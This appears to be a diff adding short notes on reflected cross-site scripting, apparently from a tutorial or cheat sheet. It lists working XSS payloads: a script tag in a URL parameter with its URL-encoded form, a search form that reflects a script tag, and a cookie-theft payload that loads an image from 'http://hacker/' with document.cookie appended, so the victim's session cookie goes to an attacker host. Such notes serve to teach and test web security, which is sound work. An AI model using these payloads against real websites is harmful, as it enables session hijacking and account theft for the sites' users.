@@ -1,0 +1,13 @@
+http://abc.com/index.php?id=<script>alert(document.cookie)</script>
+Replace by: http%3A%2F%2Fvictim.com%2Findex.php%3Fid%3D%3Cscript%3Ealert%2
+
+<form action="" method="GET">
+    <input type="text" name="search" value="<SCRIPT>alert('XSS%20Testing')</SCRIPT>">
+	<input type="submit" value="Submit">
+</form>
+<div>
+	Sorry, no search results found for ""><SCRIPT>alert('XSS%20Testing')</SCRIPT>
+</div>
+Replace by <SCRIPT>var+img=new+Image();img.src="http://hacker/"%20+%20document.cookie;</SCRIPT>
+Create new DOM image: var img=new Image();
+Access cookie data: document.cookie;
